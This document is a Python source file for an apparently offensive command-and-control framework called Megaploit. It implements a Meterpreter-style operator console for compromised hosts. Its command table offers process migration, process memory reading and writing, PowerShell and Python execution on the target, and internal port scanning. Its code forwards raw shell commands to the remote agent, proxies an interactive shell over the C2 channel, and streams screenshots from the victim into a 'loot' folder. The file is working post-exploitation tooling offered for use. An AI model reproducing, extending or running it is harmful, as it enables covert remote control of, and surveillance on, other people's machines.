"""
megaploit.server.meterp_session
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Advanced interactive session console — the Megaploit equivalent of Meterpreter.

Features
--------
* Tab-completion  — readline-backed, completes all registered command names
* Session history — persisted across invocations (loot/.<session_id>.history)
* Auto sysinfo    — runs ``sysinfo`` + ``whoami`` on first attach
* Background      — ``background`` / Ctrl-Z detaches without killing the session
* Foreground      — ``sessions -i <id>`` (handled by CLI) re-attaches
* PTY proxy       — ``interactive`` drops into a real PTY with resize support
* Screenshot      — ``shot`` takes a screenshot and auto-opens it (if possible)
* Stream viewer   — ``stream <n>`` grabs N JPEG frames and saves them to loot
* Extension API   — ``load``, ``unload``, ``extensions`` manage runtime modules
* Help table      — ``help`` shows every command with its description

Usage (called by CLI after a session is accepted)::

    from megaploit.server.meterp_session import MeterpreterSession
    sess = MeterpreterSession(session, key=secret_key)
    sess.interact()          # blocks until operator backgrounds / exits
"""

from __future__ import annotations

import base64
import os
import socket
try:
    import readline as _readline
    _HAS_READLINE = True
except ImportError:
    _HAS_READLINE = False
    _readline = None  # type: ignore[assignment]
import sys
from datetime import datetime, timezone
from typing import Optional

from megaploit.core.protocol import send_msg, recv_msg
from megaploit.server.session import Session
from megaploit.server import commands as _cmds


# ANSI colour helpers — disabled on Windows if not supported
def _c(code: str, text: str) -> str:
    if sys.stdout.isatty() and sys.platform != "win32":
        return f"\033[{code}m{text}\033[0m"
    return text


_RED    = lambda t: _c("31", t)
_GREEN  = lambda t: _c("32", t)
_YELLOW = lambda t: _c("33", t)
_CYAN   = lambda t: _c("36", t)
_BOLD   = lambda t: _c("1",  t)
_DIM    = lambda t: _c("2",  t)


# ---------------------------------------------------------------------------
# Command table — extra commands handled locally (not delegated to the agent)
# ---------------------------------------------------------------------------

_LOCAL_HELP: dict[str, str] = {
    "help":          "Show this help table",
    "background":    "Detach session (keep alive) and return to main CLI",
    "sessions":      "List all active sessions",
    "interactive":   "Drop into a real PTY shell (Ctrl-C to detach)",
    "stream <n>":    "Pull <n> screenshot frames over the C2 channel",
    "load <path>":   "Load a Python extension into the agent",
    "unload <name>": "Unload a previously loaded extension",
    "extensions":    "List loaded extensions on the agent",
    "migrate <pid>": "Migrate agent into another process",
    "memory_read <pid> <addr> <size>": "Read process memory",
    "memory_write <pid> <addr> <b64>": "Write process memory",
    "port_scan <host> <ports>":        "TCP scan from the target's perspective",
    "run_psh <cmd>":    "Execute a PowerShell one-liner on Windows",
    "run_python <code>":"Execute Python code inside the agent's interpreter",
    "whoami":        "Current user + privilege level",
    "getpid":        "Agent's own PID",
    "getuid":        "UID / domain\\user details",
    "sleep <secs>":  "Put the agent to sleep",
    "beacon_sleep <secs>": "Adjust beacon reconnect interval",
    "shot":          "Quick screenshot (alias for screenshot)",
    "exit":          "Terminate the agent and close the session",
}

# Merge in all server-side command names for tab completion
_ALL_COMPLETIONS: list[str] = sorted(
    list(_LOCAL_HELP.keys()) + list(_cmds._registry.keys())
)


# ---------------------------------------------------------------------------
# Readline completer
# ---------------------------------------------------------------------------

class _Completer:
    def __init__(self, options: list[str]) -> None:
        self._options = options

    def complete(self, text: str, state: int) -> Optional[str]:
        matches = [o for o in self._options if o.startswith(text)]
        try:
            return matches[state]
        except IndexError:
            return None


# ---------------------------------------------------------------------------
# MeterpreterSession
# ---------------------------------------------------------------------------

class MeterpreterSession:
    """
    Interactive operator console for a single active Session.

    Parameters
    ----------
    session     : Session dataclass from megaploit.server.session
    all_sessions: shared list of Session objects (for ``sessions`` command)
    background_cb: callable invoked when the operator backgrounds the session
    """

    PROMPT_TPL = "{cyan}megaploit{reset} ({green}{ip}{reset}) {bold}>{reset} "

    def __init__(
        self,
        session: Session,
        all_sessions: Optional[list] = None,
        background_cb=None,
    ) -> None:
        self._session    = session
        self._all        = all_sessions or []
        self._bg_cb      = background_cb
        self._backgrounded = False

        # History file per session
        self._hist_file = os.path.join(
            "loot", f".session_{session.id}.history"
        )

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def interact(self) -> None:
        """
        Enter the interactive REPL.  Returns when the operator backgrounds or
        exits.
        """
        self._setup_readline()
        self._banner()
        self._auto_sysinfo()

        while True:
            try:
                line = input(self._prompt()).strip()
            except (EOFError, KeyboardInterrupt):
                # Ctrl-D / Ctrl-C — background the session
                print()
                self._background()
                break

            if not line:
                continue

            # Ctrl-Z substitute (background)
            if line in ("background", "bg"):
                self._background()
                break

            if line in ("exit", "quit"):
                self._do_exit()
                break

            if line == "sessions":
                self._list_sessions()
                continue

            if line == "interactive":
                self._interactive_pty()
                continue

            if line.startswith("stream "):
                self._stream(line.split()[1:])
                continue

            if line == "shot":
                line = "screenshot"

            # Delegate everything else to the command registry
            parts = line.split(maxsplit=1)
            name  = parts[0].lower()
            args  = parts[1].split() if len(parts) > 1 else []

            result = self._dispatch(name, args, line)
            if result is None:
                continue
            if result.close_session:
                self._teardown()
                break
            if result.output:
                colour = _GREEN if result.ok else _RED
                print(colour(result.output) if not result.ok else result.output)

        self._save_history()

    # ------------------------------------------------------------------
    # Prompt
    # ------------------------------------------------------------------

    def _prompt(self) -> str:
        tag = f"@{self._session.tag}" if self._session.tag else ""
        return (
            f"{_CYAN('megaploit')} "
            f"({_GREEN(self._session.ip + tag)}) "
            f"{_BOLD('>')} "
        )

    # ------------------------------------------------------------------
    # Banner
    # ------------------------------------------------------------------

    def _banner(self) -> None:
        s = self._session
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        print()
        print(_BOLD("  ╔══════════════════════════════════════════════════╗"))
        print(_BOLD("  ║") + _CYAN("  Megaploit Advanced Shell  ") +
              _DIM("(Meterpreter-class)") + _BOLD("  ║"))
        print(_BOLD("  ╚══════════════════════════════════════════════════╝"))
        print(f"  Session  : {_GREEN(str(s.id))}   {s.ip}:{s.port}")
        print(f"  Attached : {ts}")
        if s.hostname:
            print(f"  Host     : {s.hostname}  ({s.os_name})")
        if s.username:
            print(f"  User     : {s.username}")
        print(f"  Type 'help' for all commands.  Ctrl-Z / 'background' to detach.")
        print()

    # ------------------------------------------------------------------
    # Auto sysinfo on first attach
    # ------------------------------------------------------------------

    def _auto_sysinfo(self) -> None:
        hist_key = f"_sysinfo_done_{self._session.id}"
        if getattr(self, hist_key, False):
            return
        try:
            print(_DIM("  [*] Gathering target info…"))
            result = self._dispatch("sysinfo", [], "sysinfo")
            if result and result.ok and result.output:
                # Update session metadata from sysinfo lines
                for line in result.output.splitlines():
                    if "Hostname" in line:
                        self._session.hostname = line.split(":", 1)[-1].strip()
                    elif "OS" in line:
                        self._session.os_name = line.split(":", 1)[-1].strip()
                    elif "Username" in line:
                        self._session.username = line.split(":", 1)[-1].strip()
                print(_DIM(result.output))

            # Also run whoami for quick privilege snapshot
            result2 = self._dispatch("whoami", [], "whoami")
            if result2 and result2.ok and result2.output:
                print(f"  {_YELLOW('Whoami:')} {result2.output}")
        except Exception:
            pass
        setattr(self, hist_key, True)
        print()

    # ------------------------------------------------------------------
    # Command dispatch
    # ------------------------------------------------------------------

    def _dispatch(self, name: str, args: list[str],
                  raw_line: str) -> Optional["_cmds.CommandResult"]:
        defn = _cmds._registry.get(name)
        if defn:
            try:
                return defn.handler(self._session, args)
            except (ConnectionError, OSError):
                print(_RED("[-] Connection lost."))
                return _cmds.CommandResult(ok=False, close_session=True)
            except Exception as exc:
                return _cmds.CommandResult(ok=False,
                                           output=f"[-] Internal error: {exc}")
        # Unknown → forward as raw shell command
        try:
            send_msg(self._session.conn, raw_line)
            out = recv_msg(self._session.conn)
            return _cmds.CommandResult(ok=True, output=str(out))
        except (ConnectionError, OSError):
            print(_RED("[-] Connection lost."))
            return _cmds.CommandResult(ok=False, close_session=True)

    # ------------------------------------------------------------------
    # Special commands
    # ------------------------------------------------------------------

    def _background(self) -> None:
        self._backgrounded = True
        print(f"\n  {_YELLOW('[*] Session ' + str(self._session.id) + ' backgrounded.')}")
        if self._bg_cb:
            self._bg_cb(self._session)

    def _do_exit(self) -> None:
        defn = _cmds._registry.get("exit")
        if defn:
            defn.handler(self._session, [])
        else:
            try:
                send_msg(self._session.conn, "exit")
            except Exception:
                pass
        self._teardown()

    def _teardown(self) -> None:
        print(f"  {_DIM('[*] Session closed.')}")

    def _list_sessions(self) -> None:
        if not self._all:
            print("  (no session list provided)")
            return
        print(f"\n  {'ID':<5} {'IP':<18} {'TAG':<16} {'UPTIME':<12} HOST")
        print("  " + "─" * 70)
        for s in self._all:
            mark = " ◄" if s.id == self._session.id else ""
            print(f"  {s.id:<5} {s.ip:<18} {(s.tag or ''):<16} "
                  f"{s.uptime:<12} {s.hostname or '?'}{mark}")
        print()

    # ------------------------------------------------------------------
    # Interactive PTY
    # ------------------------------------------------------------------

    def _interactive_pty(self) -> None:
        """Drop into a real PTY shell proxied through the C2 channel."""
        print(_DIM("  [*] Starting PTY session… (type 'exit' to return)"))
        try:
            send_msg(self._session.conn, "pty_shell")

            # Wait for PTY_READY
            self._session.conn.settimeout(10)
            ack = recv_msg(self._session.conn)
            self._session.conn.settimeout(None)
            if ack != "PTY_READY":
                print(f"[-] PTY not ready: {ack}")
                return

            print(_DIM("  [*] PTY ready — Ctrl-C to detach"))

            # Proxy loop
            import select as _select
            self._session.conn.settimeout(0.05)

            while True:
                # Read from agent
                try:
                    msg = recv_msg(self._session.conn)
                    if isinstance(msg, str):
                        if msg == "STREAM_END" or msg == "[*] PTY session ended":
                            break
                        if msg.startswith("PTY_DATA:"):
                            sys.stdout.write(msg[9:])
                            sys.stdout.flush()
                except socket.timeout:
                    pass
                except (ConnectionError, OSError):
                    break

                # Read from operator stdin (non-blocking)
                try:
                    r, _, _ = _select.select([sys.stdin], [], [], 0.02)
                    if r:
                        line = sys.stdin.readline()
                        if not line or line.strip() in ("exit", "PTY_EXIT"):
                            send_msg(self._session.conn, "PTY_EXIT")
                            break
                        send_msg(self._session.conn, "PTY_IN:" + line)
                except (KeyboardInterrupt, EOFError):
                    send_msg(self._session.conn, "PTY_EXIT")
                    break
                except Exception:
                    pass

            self._session.conn.settimeout(None)
            print(_DIM("\n  [*] PTY session ended."))
        except Exception as exc:
            print(_RED(f"[-] interactive PTY error: {exc}"))
            self._session.conn.settimeout(None)

    # ------------------------------------------------------------------
    # Screenshot stream
    # ------------------------------------------------------------------

    def _stream(self, args: list[str]) -> None:
        count = args[0] if args and args[0].isdigit() else "20"
        fps   = args[1] if len(args) > 1 and args[1].isdigit() else "5"
        print(_DIM(f"  [*] Streaming {count} frames @ {fps} fps…"))

        try:
            send_msg(self._session.conn, f"screenshot_stream {count} {fps}")

            loot_dir = self._session.loot_dir()
            frames_dir = os.path.join(loot_dir, "stream")
            os.makedirs(frames_dir, exist_ok=True)
            idx = 0
            self._session.conn.settimeout(float(count) / int(fps) + 10)

            while True:
                msg = recv_msg(self._session.conn)
                if msg == "STREAM_END":
                    break
                if isinstance(msg, str) and msg.startswith("FRAME:"):
                    data = base64.b64decode(msg[6:])
                    fname = os.path.join(frames_dir, f"frame_{idx:04d}.jpg")
                    with open(fname, "wb") as f:
                        f.write(data)
                    idx += 1
                    sys.stdout.write(f"\r  {idx}/{count} frames received")
                    sys.stdout.flush()

            self._session.conn.settimeout(None)
            print(f"\n{_GREEN('[+]')} {idx} frames saved to {frames_dir}")

        except socket.timeout:
            print(_RED("\n[-] Stream timed out"))
            self._session.conn.settimeout(None)
        except Exception as exc:
            print(_RED(f"\n[-] stream error: {exc}"))
            self._session.conn.settimeout(None)

    # ------------------------------------------------------------------
    # Readline setup / teardown
    # ------------------------------------------------------------------

    def _setup_readline(self) -> None:
        if not _HAS_READLINE:
            return
        comp = _Completer(_ALL_COMPLETIONS)
        _readline.set_completer(comp.complete)
        _readline.parse_and_bind("tab: complete")
        try:
            if os.path.isfile(self._hist_file):
                _readline.read_history_file(self._hist_file)
        except OSError:
            pass

    def _save_history(self) -> None:
        if not _HAS_READLINE:
            return
        try:
            os.makedirs("loot", exist_ok=True)
            _readline.write_history_file(self._hist_file)
        except OSError:
            pass
